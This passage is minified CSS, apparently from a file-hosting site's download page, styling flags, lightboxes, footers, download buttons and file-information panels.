#goog-header-translate{background-image:url(/images/flags_svg/pak.svg)}.uz #goog-header-translate{background-image:url(/images/flags_svg/uzb.svg)}.vi #goog-header-translate{background-image:url(/images/flags_svg/vnm.svg)}.cy #goog-header-translate{background-image:url(/images/flags_svg/wal.svg)}.xh #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.yi #goog-header-translate{background-image:url(/images/flags_svg/isr.svg)}.yo #goog-header-translate{background-image:url(/images/flags_svg/nga.svg)}.zu #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.page{padding-top:10px;padding-bottom:70px;background:#fff;min-height:800px}.content{max-width:960px;margin:0 auto;position:relative;background:#fff}.social-cont{margin-top:7px;width:213px}.social-fb-cont{width:211px;border-radius:6px;background:#fff;border:1px solid #c5d0e3}.social-fb-cont>iframe{overflow:hidden;padding:15px 10px 0px;width:190px}.social-fb-cont>span{text-overflow:ellipsis;overflow:hidden;white-space:nowrap;display:block;color:#3c5a98;background:#e6e9f1 url(//static.mediafire.com/images/backgrounds/download/social/fb_16x16.png) no-repeat 10px center;border-bottom:1px solid #c5d0e3;height:35px;line-height:36px;font-size:12px;font-weight:600;border-radius:5px 5px 0 0;margin:0;text-indent:35px}#download-arrow{pointer-events:none;position:fixed;left:6px;bottom:0;z-index:9999;width:165px;height:229px;opacity:0;transition:opacity 0.2s;background-repeat:no-repeat;background-position:bottom;background-image:url(//static.mediafire.com/images/download/arrow_chrome.png)}#ParallelDL-optIn{background:#474747;border-radius:3px;color:white;font-size:10px;line-height:22px;float:right;clear:both;width:250px;text-align:center;margin-top:10px}#ParallelDL-optIn>span{padding:2px 5px;background:rgba(0,0,0,.5);border-radius:3px;margin-left:5px;text-transform:uppercase;font-size:9px}#ParallelDL-optIn:hover{background-color:#0070F0;background-color:var(--mf-blue4);color:#fff}.mobile #ParallelDL-optIn{display:none}#share{display:none;position:fixed;top:0;right:0;left:0;bottom:0;background:rgba(0,0,0,0.8);z-index:10000}#share figure{height:100%;margin:0;width:100%}#share.lightbox .close::after{right:22px;top:8px;width:30px;height:30px;border-radius:50%}@media (max-width:620px){#share.lightbox .close::after{right:10px;top:10px}}#share figcaption{height:100%;width:100%;background:transparent;padding:0}#share iframe{border:0;height:100%;width:100%;display:block}#mobile-turbo-dl-enable{display:none;position:fixed;top:0;right:0;left:0;bottom:0;background:rgba(0,0,0,0.8);z-index:10000}#mobile-turbo-dl-enable.lightbox .popup-container{background:#fff;position:fixed;margin:10px;padding:24px}#mobile-turbo-dl-enable.lightbox .popup-container .mobile-turbo-dl-enable-title{font-size:18px;display:block}#mobile-turbo-dl-enable.lightbox .popup-container .mobile-turbo-dl-enable-message{margin:12px 0;display:block;font-size:14px}#mobile-turbo-dl-btn-close{right:0;top:0;height:40px;width:40px;opacity:0.4;background:url(//static.mediafire.com/images/icons/svg_dark/close.svg) center / 20px no-repeat;position:absolute}#mobile-turbo-dl-btn-enable{box-sizing:border-box;flex-direction:row;justify-content:center;padding:8px 12px;gap:10px;height:40px;background:#FFFFFF;border:2px solid #D8DCDF;border-radius:4px;order:0;display:flex;align-items:center;text-align:center;text-transform:uppercase;color:var(--mf-gray4)}#mobile-turbo-dl-btn-cancel{margin-top:10px;flex-direction:row;justify-content:center;padding:8px 12px;gap:10px;background:var(--mf-blue4);border-radius:4px;line-height:24px;display:flex;align-items:center;text-align:center;text-transform:uppercase;color:#FFFFFF;order:1}.nonDLContentWrap{min-height:1500px}#ads{overflow:hidden;border:0;margin-bottom:50px}.ads-temp #ads,.ads-normal #ads,.spiralyze #ads{height:1450px}.ads-alternate .DLExtraInfo-wrap{position:absolute;top:738px;left:0}.ads-alternate .DLExtraInfo.DLExtraInfo-additional{margin-top:130px}.sticky-mode~#footer>#subFooterWrap{padding-bottom:200px}.sticky-mode~#cookie-accept-footer{bottom:120px;left:10px;right:10px;border-radius:10px;padding:15px}.sticky-mode~#cookie-accept-footer .CookieAcceptance-buttons{margin-right:10px}.sticky-mode~#cookie-accept-footer .CookieAcceptance-accept{padding:6px 25px}.sticky-mode .DLExtraInfo.DLExtraInfo-additional{margin-top:35px!important}.sticky-mode .nonDLContentWrap{min-height:1260px!important}.sticky-mode .content{min-height:1340px}.sticky-mode .center{margin-bottom:0px!important}.lightbox .h1,.lightbox .h2,.lightbox .h3,.lightbox .h4,.lightbox .h5,.lightbox .h6{font-weight:normal;line-height:1.4;margin-bottom:1rem}.lightbox .h1{font-size:2.9rem}.lightbox .h2{font-size:2.3rem}.lightbox .h3{font-size:1.9rem}.lightbox .h4{font-size:1.6rem}.lightbox .h5{font-size:1.3rem}.lightbox .h6{font-size:1rem;font-weight:bold}.lightbox .font-weight-normal{font-weight:normal!important}.lightbox .font-weight-bold{font-weight:bold!important}.lightbox .g-Btn{display:inline-flex;align-items:center;justify-content:center;border-radius:3px;font-family:'Open Sans',sans-serif;font-size:.79rem;font-weight:normal;cursor:pointer;height:auto;line-height:1.5;padding:6px 15px;border:0;outline:0;text-transform:uppercase;-webkit-appearance:none;box-sizing:border-box;min-height:36px}.lightbox .g-Btn--primary{color:#fff;background:#0070F0;background:var(--mf-blue4)}.lightbox .g-Btn--secondary{color:#575B65;color:var(--mf-gray4);background-color:#E9EAEB;background-color:var(--mf-gray10)}.lightbox .g-Btn--tertiary{color:#fff;background:#6c3}.lightbox .g-Btn--alt{color:#fff;background:#282f3d}.lightbox .g-Btn:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-ms-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-o-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05))}.lightbox .g-Btn--alt:hover{background-image:-webkit-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-moz-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-ms-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-o-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08))}.lightbox a.g-Btn--primary:hover,.lightbox a.g-Btn--tertiary:hover,.lightbox a.g-Btn--alt:hover{color:#fff}.lightbox a.g-Btn--secondary:hover{color:#575B65;color:var(--mf-gray4)}.lightbox .g-Icon{display:inline-block;vertical-align:middle;height:24px;width:24px;background-image:url(//static.mediafire.com/images/icons/svg_dark/icons_sprite.svg);background-repeat:no-repeat}.lightbox .g-Btn .g-Icon{margin:0 8px 0 -2px}.lightbox .dropdown .g-Icon{margin-right:8px;opacity:0.5}.lightbox .g-Icon--white{background-image:url(//static.mediafire.com/images/icons/svg_light/icons_sprite.svg)}.lightbox .g-Btn .g-Icon.g-Icon--right{margin:0 -2px 0 8px}.lightbox .g-Icon--arrowRight{background-position:-1632px 0}.lightbox{display:none}.lightbox.on,.lightbox:target{position:fixed;left:0;top:0;width:100%;height:100%;display:flex!important;align-items:center;justify-content:center;outline:none;overflow:auto;z-index:1000}.lightbox.on{background-color:rgba(0,0,0,.7)}.lightbox:not(:target,.on){display:none!important}.lightbox figure{margin:auto}.lightbox figcaption{position:relative;padding:2px;background-color:#fff;border-radius:5px;box-shadow:0 2px 10px 0 rgba(0,0,0,.35);z-index:1001}.lightbox .close{position:relative;display:block}.lightbox .close::after{right:0;top:0;height:40px;width:40px;border-radius:5px;opacity:0.4;background:url(//static.mediafire.com/images/icons/svg_dark/close.svg) center / 20px no-repeat;position:absolute;display:flex;z-index:1;align-items:center;justify-content:center;background-color:white;color:white;content:"";z-index:1002}.lightbox .close:hover:after{opacity:0.8}.lightbox .close::before{left:0;top:0;width:100%;height:100%;position:fixed;content:"";cursor:default;z-index:1000}.lightbox-title{font-size:18px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding:20px 30px;display:block}.lightbox-content{padding:0 30px 80px}.lightbox-content label{display:block;margin-bottom:5px;font-weight:bold}.lightbox-btns{padding:0px 15px 15px;position:absolute;bottom:0;right:0;left:0}.lightbox-btns .g-Btn{float:right;margin-left:10px}#footer{padding:0px;width:100%;background-color:#f3f3f3;height:auto;min-height:260px;color:#575B65;color:var(--mf-gray4);box-shadow:inset 0 1px 0px 0 rgba(0,0,0,.03)}#footer em{font-style:normal;font-weight:bold}#footer b{font-weight:normal}.footerColWrap{padding:30px 0 10px}.footerCol{width:25%;float:left;font-size:13px;padding-right:30px;box-sizing:border-box}.footerCol h2{display:block;padding:0 0 0px 0;margin-bottom:10px;font-family:'Open Sans',sans-serif;font-size:12px;position:relative;font-weight:600;text-transform:uppercase}#footer a{color:#575B65;color:var(--mf-gray4)}#footer a:hover{color:#222835;color:var(--mf-gray2)}#footerColFollow a{padding-left:24px}#footer .mflogo_footer{display:none;position:absolute;top:32px;left:0;height:16px;width:122px;padding:0;margin-top:-3px;text-align:center;background:url(//static.mediafire.com/images/v4images/backgrounds/mflogo_footer.png) right bottom no-repeat}#footer .mflogo_footer:hover{text-decoration:none}.myfiles #footer,.filePreview #footer,.fileEdit #footer,.appView #footer{height:0;min-height:0;position:fixed;bottom:0;background:#ebebeb;-webkit-box-shadow:0px -1px 0px 0px rgba(0,0,0,.15);box-shadow:0px -1px 0px 0px rgba(0,0,0,.15);-webkit-transition:height .3s ease 0s;-moz-transition:height .3s ease 0s;font-family:'Open Sans',sans-serif;z-index:20}#subFooterWrap{position:relative;border-top:1px solid #E3E3E3}.myfiles #subFooterWrap,.filePreview #subFooterWrap,.fileEdit #subFooterWrap{border:none}.myfiles #subFooterWrap:before,.filePreview #subFooterWrap:before,.fileEdit #subFooterWrap:before{display:none}#subFooter{position:relative;height:auto;padding:17px 0;clear:both;font-size:12px}.subFooterLinks{margin-right:124px}#subFooter li{display:inline;margin-right:18px;position:relative}#subFooter li:first-child:before,#subFooter li.footerIcn:before{display:none}#subFooter a{text-shadow:none}#subFooterSocialWrap{min-width:890px}#subFooterSocial{position:absolute;right:0;top:0}#subFooterSocial li{float:right;margin:12px 0 0 10px}.texasNote{display:none}.footerIcn a{display:block;position:relative;height:28px;width:28px;padding:0;border-radius:3px;-webkit-transition:background-color .2s linear;-moz-transition:background-color .2s linear;-ms-transition:background-color .2s linear;-o-transition:background-color .2s linear;transition:background-color .2s linear;background-color:rgba(0,0,0,0.1)}.footerIcn a:hover{background-color:#47A9EB}.footerIcn span{position:absolute;height:100%;width:100%;top:0;left:0;background-image:url(//static.mediafire.com/images/backgrounds/footer/social/footerIcons.png);background-repeat:no-repeat;cursor:pointer;opacity:.3}.footerIcnFb{background-position:0px top}.footerIcnTw{background-position:-28px top}.footerIcnBlog{background-position:-84px top}#subFooter li.myFilesFooterShow{display:none}.myfiles #subFooter li.myFilesFooterShow{display:block}.myfiles #subFooter .dropUp li{margin:0;display:block}.myfiles #subFooter .footerColWrap li:before,.filePreview #subFooter .footerColWrap li:before,.fileEdit #subFooter .footerColWrap li:before{display:none}#minSocialLinks{display:none}@media (max-width:960px){.footerCol{padding:0 30px}#subFooter{padding:17px 30px}#subFooterSocial{padding-right:30px}}@media (max-width:910px){#subFooterSocial{position:static;margin:0;float:left;width:auto;padding:20px 0}}@media (max-width:770px){.footerCol{width:auto;float:none;padding:10px 30px 0;border-bottom:1px solid #e8e9ec}.footerCol li{display:inline-block;margin-right:20px;font-size:12px;margin-bottom:10px}.footerColWrap{padding:0}#subFooterWrap{border:0}#subFooter{padding:30px}#subFooter li#copyrightInfo{display:block;margin:10px 0 30px 0}.subFooterLinks{margin:0}#subFooter li:not(.footerIcn){margin:0 20px 10px 0;display:inline-block}}.ads-temp .content,.ads-normal .content,.spiralyze .content{width:960px}.ads-normal .content,.ads-alternate .content{min-height:1500px}.ads .dl-btn-cont{width:auto;margin:0;border-radius:6px 6px 0 0}.ads-temp .ads .dl-btn-cont{width:auto;border-radius:6px;margin:0}.center{width:604px;height:580px;position:absolute;background:#fff;right:0;top:110px;overflow:hidden;overflow-y:auto;border-radius:6px}.spiralyze .center{height:610px}.dl-promo-cont{color:#fff;border-radius:0 0 6px 6px;box-shadow:inset 0 1px 0 0 rgba(255,255,255,.1);font-size:13px;text-align:center;position:relative;display:block;padding:8px;background:#474747 url(//static.mediafire.com/images/backgrounds/download/dl_promo_logo.png) 10px 8px no-repeat}.dl-promo-cont>span{position:absolute;right:5px;top:5px;height:26px;line-height:26px;padding:0 20px;background:#757575;text-transform:uppercase;font-size:10px;font-weight:bold;border-radius:3px}.dl-promo-cont:hover{color:#fff}.ads-temp .dl-promo-cont{max-width:600px;width:100%;height:34px;margin-left:auto;margin-right:auto;display:block;background:#fff;font-family:Open Sans,Sans-Serif;font-size:12px;line-height:34px;text-align:center;color:#0077ff;padding:0}.ads-temp .dl-promo-cont:hover{text-decoration:underline;color:#0077ff}#form_captcha .dl-utility-nav{display:none}.dl-info{position:relative;font-size:13px;line-height:18px;padding:20px 20px 0}.intro.icon{width:100%;background-position:0 0!important;height:50px;position:static;font-size:18px;line-height:22px;padding-top:8px;margin-bottom:20px}.intro>div{margin:0 240px 0 60px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.intro .filename{font-weight:300}.intro .filetype{font-weight:700;color:#000}.details{font-weight:bold;margin:0 240px 20px 0}.details span{font-weight:normal}.description-subheading{font-weight:bold}.description p{margin:0 240px 12px 0}.sidebar{position:absolute;right:0;width:213px;top:20px}.sidebar>div{padding:10px;background:#eee;margin-bottom:10px}.sidebar ul{margin-top:10px}.sidebar .filename{display:inline-block;font-weight:bold;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.apps>ul a{display:block;height:31px;padding-left:43px;font-size:11px;line-height:13px;margin-bottom:4px;padding-top:5px;position:relative;color:#0045AD;color:var(--mf-blue3)}.apps>ul a:before{content:"";position:absolute;top:0;left:0;height:36px;width:36px;background-image:url(//static.mediafire.com/images/backgrounds/download/apps_list_sprite-v6.png);background-repeat:no-repeat}.apps a[title="Windows Picture and Fax Viewer"]:before{background-position:0 0}.apps a[title="Adobe Photoshop"]:before{background-position:0 -36px}.apps a[title="Apple Preview"]:before{background-position:0 -72px}.apps a[title="AppleWorks"]:before{background-position:0 -72px}.apps a[title="Microsoft Word"]:before{background-position:0 -144px}.apps a[title="LibreOffice"]:before{background-position:0 -180px}.apps a[title="WinZip for PC"]:before{background-position:0 -216px}.apps a[title="WinZip for Mac"]:before{background-position:0 -324px}.apps a[title="7-Zip"]:before{background-position:0 -252px}.apps a[title="QuickTime"]:before{background-position:0 -288px}.apps a[title="Windows Media Player"]:before{background-position:0 0}.apps a[title="VideoLAN VLC Media Player"]:before{background-position:0 -360px}.apps a[title="Microsoft PowerPoint"]:before{background-position:0 -396px}.apps a[title="iZip"]:before{background-position:0 -468px}.apps a[title="iTunes"]:before{background-position:0 -540px}.apps a[title="Apache OpenOffice"]:before{background-position:0 -576px}.apps a[title="Sublime Text 2"]:before{background-position:0 -612px}.apps a[title="Notepad++"]:before{background-position:0 -648px}.apps a[title="Infix PDF Editor"]:before{background-position:0 -684px}.apps a[title="Adobe Reader"]:before{background-position:0 -720px}.apps a[title="Microsoft 365"]:before{background-position:0 -108px}.apps a[title="PaintShop Pro"]:before{background-position:0 -432px}.apps a[title="Roxio Creator"]:before{background-position:0 -504px}.apps a[title="WordPerfect Office"]:before{background-position:0 -756px}.apps a[title="Pinnacle Studio"]:before{background-position:0 -792px}.Download-compatibility>div{margin-bottom:15px}.Download-compatibility .g-Select{width:100%;padding-left:10px;margin-bottom:15px}.Download-compatibilityStatus{font-size:11px;line-height:14px}.Download-compatibilityStatus span{height:18px;width:18px;float:left}.Download-compatibilityStatus p{margin-left:28px}.Download-compatibilityStatus.is-compatible span{background:url(//static.mediafire.com/images/icons/svg_dark/check_circle_green.svg) center / 18px no-repeat}.Download-compatibilityStatus.is-notCompatible span{background:url(//static.mediafire.com/images/icons/svg_dark/close_circle_red.svg) center / 18px no-repeat}.DLMobile-upsellBox{display:none;margin:0 auto 50px;color:#ffffff;text-align:center;position:relative;z-index:1;max-width:450px}.DLMobile-upsellBox>div{background:#0045a6;padding:20px;margin:0 20px;box-sizing:border-box}.mobile.ads-mobileLegacy .DLMobile-upsellBox,.mobile.ads-mobile4 .DLMobile-upsellBox{display:block}.DLMobile-upsellBoxLogo{display:inline-block;margin:10px 0 15px;width:60px;height:60px;border-radius:50%;background:#07f url(//static.mediafire.com/images/backgrounds/header/mf_logo_u1_flame_reversed.svg) center / auto 26px no-repeat}.DLMobile-upsellBox p{font-size:17px;margin-bottom:20px}.DLMobile-upsellBox ul{margin:0 0 30px;text-align:left;list-style-type:disc;display:inline-block}.DLMobile-upsellBox a{display:block;border-radius:3px;padding:12px 0;background:#ff8637;color:#000;font:normal 14px/16px Arial,sans-serif;text-transform:uppercase}.spiralyze .DLExtraInfo-wrap,.ads-normal .DLExtraInfo-wrap{position:absolute;top:850px;left:0}.ads-mobileLegacy .dl_pro_upsell{display:none}.ads-alternate:not(.ads-mobile4) .content{min-width:960px}.DLExtraInfo{box-sizing:border-box;margin-bottom:30px;padding-bottom:30px;border-bottom:2px solid #f4f4f5;display:flex;flex-direction:row;justify-content:space-between;flex-wrap:wrap;width:960px}.DLExtraInfo:last-child{border:0;margin-bottom:0;padding-bottom:0}.DLExtraInfo-groupHeading{color:#0070F0;color:var(--mf-blue4);font-size:24px;font-weight:normal;width:100%;margin:0 0 30px;padding:0 30px;box-sizing:border-box;display:none}.DLExtraInfo-sectionHeading{font-size:14px;margin:0 0 15px;width:100%;font-weight:bold}.DLExtraInfo-sectionSubHeading{margin:0;font-size:13px}.DLExtraInfo p{font-size:13px;line-height:1.4;margin-bottom:10px}.DLExtraInfo-column{display:flex;flex-wrap:wrap;flex:1;align-content:flex-start;padding:0 25px}.DLExtraInfo-column:first-child{padding-left:0}.DLExtraInfo-column:last-child{padding-right:0}.DLExtraInfo-row{display:flex;flex-wrap:wrap;padding:0 0 20px 0}.DLExtraInfo-sectionGraphic{background-color:#fff;height:96px;width:160px;box-shadow:inset 0 0 0 2px rgba(0,0,0,.06);margin:0 30px 15px 0;padding:20px;box-sizing:border-box;position:relative}.DLExtraInfo-sectionGraphicCenter{height:100%;width:100%;background-size:contain;background-position:center;background-repeat:no-repeat}.DLExtraInfo-sectionIcon{width:72px;height:72px;margin:0 30px 15px 0;background-size:contain;background-position:center;background-repeat:no-repeat}.DLExtraInfo-sectionDetails{flex:1;min-height:50px}.DLExtraInfo-statusOverlay{position:absolute;top:0;left:0;background:#fff;width:100%;height:100%;display:flex;justify-content:center;align-items:center;font-size:13px}.DLExtraInfo-statusOverlay div{padding:30px}.DLExtraInfo-sectionGraphic .DLExtraInfo-statusOverlay div{background:url(//static.mediafire.com/images/icons/svg_dark/image-broken-variant.svg) center / 24px no-repeat;opacity:.2}.DLExtraInfo-uploadLocationMap{height:227px;background:#4cacff;box-shadow:inset 0 0 0 2px rgba(0,0,0,.06);margin-bottom:30px;width:100%;position:relative}.DLExtraInfo-uploadLocationMapBg.Continent{background:#4cacff url(//static.mediafire.com/images/backgrounds/download/additional_content/world.svg) center / contain no-repeat}.DLExtraInfo-uploadLocationMap span{display:inline-block;padding:4px 8px;color:#fff;font-size:11px;background-color:rgba(0,0,0,.4);position:relative;z-index:1}.DLExtraInfo-uploadLocationRegion{background-position:center;background-size:contain;background-repeat:no-repeat;position:absolute;width:100%;height:100%;top:0;left:0}.DLExtraInfo-uploadLocationRegion.continent-na{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-na.svg)}.DLExtraInfo-uploadLocationRegion.continent-sa{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-sa.svg)}.DLExtraInfo-uploadLocationRegion.continent-eu{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-eu.svg)}.DLExtraInfo-uploadLocationRegion.continent-as{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg)}.DLExtraInfo-uploadLocationRegion.continent-af{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-af.svg)}.DLExtraInfo-uploadLocationRegion.continent-oc{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-oc.svg)}.DLExtraInfo-uploadLocationRegion.country-ru{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/country-ru.svg)}.DLExtraInfo-uploadLocationRegion.country-tr{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/country-tr.svg)}.DLExtraInfo-uploadLocation .DLExtraInfo-sectionGraphic{width:80px;height:50px;background-position:0 0;background-size:contain;background-repeat:no-repeat;background-color:transparent;box-shadow:none;margin-bottom:0}.DLExtraInfo-uploadLocation p{margin-bottom:0}.DLExtraInfo-virusTotal p span{color:#6c3}.DLExtraInfo-virusTotalImage{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/flag.svg)}.DLExtraInfo-uploadIsp .DLExtraInfo-sectionGraphicCenter{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/dt.svg)}.DLExtraInfo-accountStatusImage{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/mf_round.svg)}.DLExtraInfo-referrer .DLExtraInfo-sectionIcon{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/gh.svg)}.browser-android{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_android.png)}.browser-uc{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_uc.png)}.browser-chrome{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_chrome.svg)}.browser-edge{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_edge.svg)}.browser-firefox{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_firefox.svg)}.browser-ie{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_ie.svg)}.browser-opera{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_opera.svg)}.browser-safari{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_safari.svg)}.browser-samsung{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_samsung.svg)}.browser-unknown{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_unknown.svg)}.DLExtraInfo-downloadAppStatus.is-upToDate{color:#6c3}.DLExtraInfo-downloadAppStatus.is-outOfDate{color:#ef5939}.ExternalLink:after{content:"";display:inline-block;height:12px;width:12px;vertical-align:baseline;margin-left:4px;background:url(//static.mediafire.com/images/icons/svg_dark/external_link.svg) 0 1px no-repeat}p.DLExtraInfo-compatibilityStatus{width:100%;font-weight:bold;margin-bottom:30px}.DLExtraInfo-compatibilityStatus span{display:inline-block;height:18px;width:18px;background:#ddd;vertical-align:middle;margin-right:10px}.DLExtraInfo-compatibilityStatus.is-compatible span{background:url(//static.mediafire.com/images/icons/svg_dark/check_circle_green.svg) center / 18px no-repeat}.DLExtraInfo-compatibilityStatus.is-notCompatible span{background:url(//static.mediafire.com/images/icons/svg_dark/close_circle_red.svg) center / 18px no-repeat}.DLExtraInfo-compatibility .DLExtraInfo-sectionGraphic{height:160px}.DLExtraInfo-compatibility .DLExtraInfo-sectionGraphicCenter{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/wikipedia_logo_v2.svg)}.DLExtraInfo-downloadChart{width:100%}.DLExtraInfo-downloadChartGraph{height:400px;background:#fff;border:2px solid hsl(225,9%,93%);border-bottom-color:#282f3d;box-sizing:border-box;padding-top:40px;display:flex;position:relative}.DLExtraInfo-downloadChartNumbers{display:flex;flex-direction:column;width:100%;justify-content:space-between;margin:0;padding:40px 0 0;box-sizing:border-box;position:absolute;bottom:0;top:0}.DLExtraInfo-downloadChartNumbers li{text-transform:uppercase;font-size:11px;color:#b2b7c4;display:flex;align-items:center}.DLExtraInfo-downloadChartNumbers li:last-child{visibility:hidden}.DLExtraInfo-downloadChartNumbers li span{width:60px;text-align:right;padding:0 15px;box-sizing:border-box;position:relative;top:-5px;height:0}.DLExtraInfo-downloadChartNumbers li:after{content:"";height:1px;background:rgba(0,0,0,.05);flex:1}.DLExtraInfo-downloadChartBars{display:flex;justify-content:space-around;align-items:flex-end;flex:1;padding-left:60px;position:relative}.DLExtraInfo-downloadChartBars div{width:12%;background:#6c3}.DLExtraInfo-downloadChartDays{display:flex;margin:10px 0 30px;padding-left:60px;justify-content:space-around}.DLExtraInfo-downloadChartDays li{flex:1;text-align:center;text-transform:uppercase;font-size:11px;color:#b2b7c4}.DLExtraInfo-downloadChartLegend{font-size:12px;font-style:italic;margin-bottom:50px}.DLExtraInfo-downloadChartLegend div{display:inline-block;height:16px;width:16px;background:#6c3;vertical-align:text-bottom}.DLExtraInfo-downloadChartLegend span{margin:0 8px}.DLExtraInfo-downloadList ul{margin:0;font-size:12px;width:100%;position:relative}.DLExtraInfo-downloadList li{border-bottom:1px solid #e8e9ec;padding:8px 0;display:flex;justify-content:space-between;word-break:break-all}.DLExtraInfo-downloadList li:last-child{border:none;padding-bottom:0}.DLExtraInfo-downloadTotalsDetail{background:#fff;border:2px solid hsl(225,9%,93%);display:flex;width:100%;position:relative}.DLExtraInfo-downloadTotalsDetailData,.DLExtraInfo-downloadTotalsDetailFiles{flex:1;padding:15px}.DLExtraInfo-downloadTotalsDetailData{border-right:2px solid hsl(225,9%,93%)}.DLExtraInfo-downloadTotalsDetail .DLExtraInfo-sectionSubHeading{font-weight:normal;margin-bottom:5px}.DLExtraInfo-downloadTotalsDetail span{font-size:30px;font-weight:300}.DLExtraInfo-downloadDataGraphic,.DLExtraInfo-downloadFilesGraphic{height:60px;width:60px;float:left;opacity:.1}.DLExtraInfo-downloadDataGraphic{background:url(//static.mediafire.com/images/icons/svg_dark/database.svg) 0 0 / 48px no-repeat}.DLExtraInfo-downloadFilesGraphic{background:url(//static.mediafire.com/images/icons/svg_dark/file_multiple.svg) 0 6px / 36px no-repeat}.ie10 .DLExtraInfo-uploadLocation .DLExtraInfo-sectionGraphic{float:left}.ie10 .DLExtraInfo-upload{clear:both}.ie10 .DLExtraInfo-column{margin-bottom:50px}.ie10 .DLExtraInfo-downloadChartNumbers li{height:16.666%;padding-top:2%;box-sizing:border-box;box-shadow:inset 0 1px 0 0 rgba(0,0,0,.05);margin-left:20px}.ie10 .DLExtraInfo-downloadChartNumbers li span{padding:0}.ie10 .DLExtraInfo-downloadChartNumbers li:after{display:none}.ie10 .DLExtraInfo-downloadChartBars{height:100%;font-size:0}.ie10 .DLExtraInfo-downloadChartBars div{display:inline-block;margin:0 3%}.ie10 .DLExtraInfo-downloadChartDays{font-size:0}.ie10 .DLExtraInfo-downloadChartDays li{display:inline-block;width:12%;margin:0 3%}.mobile .DLExtraInfo-wrap{max-width:450px;margin:0 auto 320px;position:relative}.mobile .DLExtraInfo{width:auto;margin-left:20px;margin-right:20px;padding-bottom:0;flex-direction:column}.mobile .DLExtraInfo-uploadLocation .DLExtraInfo-sectionGraphic{width:60px;margin-right:20px}.mobile .DLExtraInfo-uploadLocationMap{height:200px}.mobile .DLExtraInfo-row{flex-direction:column;width:100%}.mobile .DLExtraInfo-sectionHeading{font-size:14px;margin-bottom:10px}.mobile .DLExtraInfo-column{padding:0 0 20px;flex-direction:column}.mobile .DLExtraInfo-uploadLocation{flex-direction:row}.mobile .DLExtraInfo-upload.DLExtraInfo-column{padding-bottom:0}.mobile .DLExtraInfo-downloadChartGraph{height:250px}.flag-background{background-size:contain;background-position:50%;background-repeat:no-repeat}.flag{background-size:contain;background-position:50%;background-repeat:no-repeat;position:relative;display:inline-block;width:1.33333333em;line-height:1em}.flag:before{content:"\00a0"}.flag-1x{width:1.33333333em;line-height:1em}.flag-2x{width:2.66666667em;line-height:2em}.flag-3x{width:4em;line-height:3em}.flag-4x{width:5.33333333em;line-height:4em}.flag-5x{width:6.66666667em;line-height:5em}.flag-6x{width:8em;line-height:6em}.flag-7x{width:9.33333333em;line-height:7em}.flag-8x{width:10.66666667em;line-height:8em}.flag-9x{width:12em;line-height:9em}.flag-10x{width:13.33333333em;line-height:10em}.flag-rotate-90{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.flag-rotate-180{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2);-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.flag-rotate-270{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3);-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.flag-flip-horizontal{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=0,mirror=1);-webkit-transform:scale(-1,1);-ms-transform:scale(-1,1);transform:scale(-1,1)}.flag-flip-vertical{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2,mirror=1);-webkit-transform:scale(1,-1);-ms-transform:scale(1,-1);transform:scale(1,-1)}:root .flag-rotate-90,:root .flag-rotate-180,:root .flag-rotate-270,:root .flag-flip-horizontal,:root 